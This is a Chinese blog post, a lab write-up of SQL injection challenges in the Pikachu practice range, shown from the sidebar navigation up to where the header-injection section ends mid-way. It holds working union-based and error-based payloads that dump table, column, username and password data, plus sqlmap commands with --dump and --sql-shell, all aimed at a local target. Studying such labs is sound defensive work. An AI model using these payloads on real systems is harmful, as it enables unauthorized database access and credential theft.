href="#%E5%85%B6%E4%BB%96"><span class="nav-number">10.0.5.</span> <span class="nav-text">其他</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#delete%E6%B3%A8%E5%85%A5"><span class="nav-number">11.</span> <span class="nav-text">delete注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-6"><span class="nav-number">11.1.</span> <span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93-2"><span class="nav-number">11.1.0.0.1.</span> <span class="nav-text">获取数据库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%80%BC-2"><span class="nav-number">11.1.0.0.2.</span> <span class="nav-text">获取字段值</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#insert%E6%B3%A8%E5%85%A5"><span class="nav-number">12.</span> <span class="nav-text">insert注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-number">12.1.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-7"><span class="nav-number">12.2.</span> <span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">12.2.1.</span> <span class="nav-text">获取数据库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D"><span class="nav-number">12.2.2.</span> <span class="nav-text">获取数据表名</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#group-concat-1"><span class="nav-number">12.2.2.0.1.</span> <span class="nav-text">group_concat()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#limit"><span class="nav-number">12.2.2.0.2.</span> <span class="nav-text">limit</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D-1"><span class="nav-number">12.2.3.</span> <span class="nav-text">获取字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%80%BC-3"><span class="nav-number">12.2.4.</span> <span class="nav-text">获取字段值</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap-8"><span class="nav-number">12.3.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#update%E6%B3%A8%E5%85%A5"><span class="nav-number">13.</span> <span class="nav-text">update注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-8"><span class="nav-number">13.1.</span> <span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">13.1.0.0.1.</span> <span class="nav-text">猜数据库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%8C%9C%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF-1"><span class="nav-number">13.1.0.0.2.</span> <span class="nav-text">猜字段信息</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">fn</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">16</span>
          <span class="site-state-item-name">总计</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/sql%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="fn">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="欢 迎 光 临">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="pikachu靶场系列-sql注入 | 欢 迎 光 临">
      <meta itemprop="description" content="sql注入">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          pikachu靶场系列-sql注入
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-04 11:14:24 / 修改时间：21:24:44" itemprop="dateCreated datePublished" datetime="2023-05-04T11:14:24+08:00">2023-05-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">pikachu靶场系列</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>20k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>36 分钟</span>
    </span>
</div>

            <div class="post-description">sql注入</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="sql注入概述"><a href="#sql注入概述" class="headerlink" title="sql注入概述"></a>sql注入概述</h1><p>sql注入，就是通过将服务器查询数据库的那一部分代码，传入恶意payload进行拼接，从而执行想要的命令</p>
<h3 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id=$_POST[&#x27;id&#x27;];</span><br><span class="line">$query=&quot;select username,email from member where id=$id&quot;;</span><br><span class="line">$result=execute($link, $query);</span><br></pre></td></tr></table></figure>

<p>上述代码就是典型的可以尝试sql注入的源码</p>
<p>传入的id会直接拼接到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,email from member where id=$id</span><br></pre></td></tr></table></figure>

<p>于是就可以通过sql的语法执行我们想要的命令</p>
<p>当</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 or 1=1</span><br></pre></td></tr></table></figure>

<p>则sql代码就变为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,email from member where id=1 or 1=1</span><br></pre></td></tr></table></figure>

<p>此时where后面的逻辑会被判断为真，则会输出all</p>
<p>sql注入现在在真实环境中已经没有前几年那么流行，不过还是可能存在的严重漏洞</p>
<h1 id="数字型注入-POST"><a href="#数字型注入-POST" class="headerlink" title="数字型注入(POST)"></a>数字型注入(POST)</h1><p>提交后抓取数据包</p>
<p><img src="/images%5Cimage-20230109105642791.png" alt="image-20230109105642791"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=1</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109111315150.png" alt="image-20230109111315150"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=2</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109111347975.png" alt="image-20230109111347975"></p>
<p>通过上述两个payload可以判断存在数字型的SQL注入</p>
<h3 id="猜字段数"><a href="#猜字段数" class="headerlink" title="猜字段数"></a>猜字段数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 order by 2		# 正常</span><br><span class="line">id=1 order by 3		# 异常</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109111919855.png" alt="image-20230109111919855"></p>
<h5 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h5><p><img src="/images/image-20230109112009321.png" alt="image-20230109112009321"></p>
<p>order by后面的数字表示根据第几列进行排序</p>
<p><img src="/images/image-20230109112302345.png" alt="image-20230109112302345"></p>
<p>所以当order by指定的列不存在时，就会报错</p>
<p><img src="/images/image-20230109112352909.png" alt="image-20230109112352909"></p>
<h3 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><p>上述判断出存在两个字段，就可以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select 1,database()</span><br><span class="line"></span><br><span class="line">id=1 union select 1,database()</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109112828312.png" alt="image-20230109112828312"></p>
<p>返回的数据库名为pikachu</p>
<h5 id="union"><a href="#union" class="headerlink" title="union"></a>union</h5><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集</p>
<p>需要注意的是union后面输出的列数需要和order by得出的结果相同</p>
<p><img src="/images%5Cimage-20230109113000341.png" alt="image-20230109113000341"></p>
<p>否则会报错</p>
<p><img src="/images%5Cimage-20230109113022537.png" alt="image-20230109113022537"></p>
<p>很好理解，因为它要把两个表合并成一个表</p>
<p><img src="/images%5Cimage-20230109113152391.png" alt="image-20230109113152391"></p>
<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line">或直接代入数据库</span><br><span class="line">id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;pikachu&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109135947865.png" alt="image-20230109135947865"></p>
<p>pikachu数据库存在httpinfo,member,message,user,xssblind</p>
<h5 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h5><p>information_schema是MySQL系统自带的数据库</p>
<p><img src="/images%5Cimage-20230109134842484.png" alt="image-20230109134842484"></p>
<p>其中包括了几个重要的表(仅列几个这里用到的)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</span><br><span class="line">TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</span><br><span class="line">COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</span><br></pre></td></tr></table></figure>

<p>即存放了数据库，表，列的相关信息</p>
<p>这里的information_schema.tables就包括了表的信息，table_schema列指向的就是其所属数据库</p>
<p>table_name就是表名</p>
<p><img src="/images%5Cimage-20230109135325713.png" alt="image-20230109135325713"></p>
<h5 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h5><p>可以理解为将字符串拼接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(&quot;a&quot;,1,&quot;b&quot;,table_name) from information_schema.tables;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109135737806.png" alt="image-20230109135737806"></p>
<p>当group_concat()中存在参数为字段名时，会将该列的所有字符串拼接输出</p>
<p>使用该函数主要是为了和union前的列数保持一致</p>
<h3 id="查询字段名"><a href="#查询字段名" class="headerlink" title="查询字段名"></a>查询字段名</h3><p>这里查询pikachu.user表的字段名，即表的列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure>

<p>字段信息在information_schema.columns表中</p>
<p><img src="/images%5Cimage-20230109140324209.png" alt="image-20230109140324209"></p>
<p>有id,username,password,level几个列</p>
<h3 id="读取字段的值"><a href="#读取字段的值" class="headerlink" title="读取字段的值"></a>读取字段的值</h3><p>users表下的username，password字段内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select group_concat(username),group_concat(password) from pikachu.users</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109140614225.png" alt="image-20230109140614225"></p>
<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>由于是post请求，需要先保存数据包</p>
<p><img src="/images%5Cimage-20230109141141373.png" alt="image-20230109141141373"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch</span><br></pre></td></tr></table></figure>

<p>使用-r参数指定post文件</p>
<p>-p参数指定注入点</p>
<p>–batch后续需要选择Y&#x2F;N时程序默认选择</p>
<p><img src="/images%5Cimage-20230109141451060.png" alt="image-20230109141451060"></p>
<p>当出现这样表示存在sql注入</p>
<h5 id="输出数据库相关信息"><a href="#输出数据库相关信息" class="headerlink" title="输出数据库相关信息"></a>输出数据库相关信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch --schema</span><br></pre></td></tr></table></figure>

<p>–schema参数输出数据库相关信息</p>
<p><img src="/images%5Cimage-20230109141715448.png" alt="image-20230109141715448"></p>
<h5 id="输出pikachu的表"><a href="#输出pikachu的表" class="headerlink" title="输出pikachu的表"></a>输出pikachu的表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch -D pikachu --tables</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109141832527.png" alt="image-20230109141832527"></p>
<h5 id="输出pikachu-users的字段名"><a href="#输出pikachu-users的字段名" class="headerlink" title="输出pikachu.users的字段名"></a>输出pikachu.users的字段名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch -D pikachu -T users --columns</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109141926918.png" alt="image-20230109141926918"></p>
<h5 id="输出pikachu-users-users的字段值"><a href="#输出pikachu-users-users的字段值" class="headerlink" title="输出pikachu.users.users的字段值"></a>输出pikachu.users.users的字段值</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch -D pikachu -T users --dump</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109142034486.png" alt="image-20230109142034486"></p>
<h5 id="进入sql-shell"><a href="#进入sql-shell" class="headerlink" title="进入sql shell"></a>进入sql shell</h5><p>提供数据库的交互命令行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch --sql-shell</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109142253366.png" alt="image-20230109142253366"></p>
<h5 id="或"><a href="#或" class="headerlink" title="或"></a>或</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_id.php --data=&quot;id=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch -p id</span><br></pre></td></tr></table></figure>

<h1 id="字符型注入-GET"><a href="#字符型注入-GET" class="headerlink" title="字符型注入(GET)"></a>字符型注入(GET)</h1><p>输入一个分号</p>
<p><img src="/images%5Cimage-20230109142507119.png" alt="image-20230109142507119"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109142618699.png" alt="image-20230109142618699"></p>
<p>可以判断出该注入是字符型注入</p>
<h3 id="查字段数"><a href="#查字段数" class="headerlink" title="查字段数"></a>查字段数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=vince&#x27; order by 2%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109143133507.png" alt="image-20230109143133507"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=vince&#x27; order by 3%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109143215156.png" alt="image-20230109143215156"></p>
<p>%23是#的url编码，表示注释符</p>
<p>字段数为2</p>
<h3 id="查询数据库名-1"><a href="#查询数据库名-1" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=vince&#x27; union select 1,database()%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109143432513.png" alt="image-20230109143432513"></p>
<h3 id="查询表名-1"><a href="#查询表名-1" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=vince&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109143512248.png" alt="image-20230109143512248"></p>
<h3 id="查询字段名-1"><a href="#查询字段名-1" class="headerlink" title="查询字段名"></a>查询字段名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=vince&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109143547949.png" alt="image-20230109143547949"></p>
<h3 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=vince&#x27; union select group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109143631888.png" alt="image-20230109143631888"></p>
<h3 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch -p name</span><br></pre></td></tr></table></figure>

<p>由于是get请求提交参数</p>
<p>-u指定url即可</p>
<p>其余利用在数字型注入(POST)中有详细描述</p>
<p><img src="/images%5Cimage-20230109143915692.png" alt="image-20230109143915692"></p>
<h1 id="XX型注入"><a href="#XX型注入" class="headerlink" title="XX型注入"></a>XX型注入</h1><p>根据提示，和闭合有关</p>
<p><img src="/images%5Cimage-20230109150223050.png" alt="image-20230109150223050"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27;)#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109150610816.png" alt="image-20230109150610816"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27;#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109150722802.png" alt="image-20230109150722802"></p>
<p>可以判断源码大致为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select xxx from xxx where username=&#x27;(name)&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">猜字段数</span><br><span class="line">?name=a&#x27;) order by 2%23</span><br><span class="line"></span><br><span class="line">查询数据库名</span><br><span class="line">?name=1&#x27;) union select 1,database()%23</span><br><span class="line"></span><br><span class="line">查询表名</span><br><span class="line">?name=1&#x27;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br><span class="line"></span><br><span class="line">查询字段名</span><br><span class="line">?name=1&#x27;) union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br><span class="line"></span><br><span class="line">查询字段内容</span><br><span class="line">?name=1&#x27;) union select group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure>

<h3 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_x.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch -p name</span><br></pre></td></tr></table></figure>

<h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>输入”v”就会显示所有用户名中含有”v”的用户信息</p>
<p><img src="/images%5Cimage-20230109144137831.png" alt="image-20230109144137831"></p>
<p>这里肯定使用了sql语句的模糊查询</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select xx,xx,xx from xx where xxx like &#x27;%输入的值%&#x27;;</span><br></pre></td></tr></table></figure>

<p>LIKE 关键字支持百分号”%”(匹配任意长度字符)和下划线”_”(匹配单个字符)通配符</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_name like &quot;%TA%&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109144913575.png" alt="image-20230109144913575"></p>
<p>可以判断下服务端的通配符这些是怎么写的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=v%&#x27;%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109145416985.png" alt="image-20230109145416985"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=v&#x27;%23</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109145442722.png" alt="image-20230109145442722"></p>
<p>可以大致判断出源码可能为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select xxxx from xx where xxx like &#x27;%输入的值%&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">猜字段数</span><br><span class="line">?name=a%&#x27; order by 3%23</span><br><span class="line">这里的a需要使用有输出的字母，使用1，2等这种没有输出</span><br><span class="line"></span><br><span class="line">查询数据库名(为了方便观察，把查询的字符改成其他)</span><br><span class="line">?name=1%&#x27; union select 1,2,database()%23</span><br><span class="line"></span><br><span class="line">查询表名</span><br><span class="line">?name=1%&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br><span class="line"></span><br><span class="line">查询字段名</span><br><span class="line">?name=1%&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br><span class="line"></span><br><span class="line">查询字段内容</span><br><span class="line">?name=1%&#x27; union select 1,group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure>

<h3 id="sqlmap-3"><a href="#sqlmap-3" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_search.php?name=1&amp;submit=%E6%90%9C%E7%B4%A2&quot; --batch -p name</span><br></pre></td></tr></table></figure>

<p>详细可参考数字型注入(POST)</p>
<p><img src="/images%5Cimage-20230109150021856.png" alt="image-20230109150021856"></p>
<h1 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h1><p>根据提示</p>
<p>用户名密码为admin&#x2F;123456</p>
<p><img src="/images%5Cimage-20230109230812814.png" alt="image-20230109230812814"></p>
<p>可以知道，服务器收集了请求头的user-agent和http accept请求头</p>
<p>抓取该界面的数据包</p>
<p><img src="/images%5Cimage-20230109231026283.png" alt="image-20230109231026283"></p>
<p>更改user-agent为test</p>
<p><img src="/images%5Cimage-20230109231106364.png" alt="image-20230109231106364"></p>
<p>将user-agent改为分号，报错，存在sql注入</p>
<p><img src="/images%5Cimage-20230109231226177.png" alt="image-20230109231226177"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: admin&#x27;,&#x27;&#x27;)#</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109233012407.png" alt="image-20230109233012407"></p>
<p>该错误的意思是传入表的字段数和values值的个数不一样</p>
<p>通过这个其实能判断出其应该为insert注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert 表名(字段1,字段2,字段3，字段4) values(数据1,数据2,数据3,数据4);</span><br></pre></td></tr></table></figure>

<p>除了user-agent和accept请求头的值，该表还存储了其他的值，所以报错</p>
<h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><p>使用报错注入</p>
<h5 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;),1) or &#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109233600397.png" alt="image-20230109233600397"></p>
<p>其细节在insert注入中有详细说明</p>
<h5 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: x&#x27; or updatexml(1,concat(&#x27;.&#x27;,(select username from users limit 0,1),&#x27;.&#x27;),1) or &#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109233713229.png" alt="image-20230109233713229"></p>
<h2 id="sqlmap-4"><a href="#sqlmap-4" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>将请求包保存为文件</p>
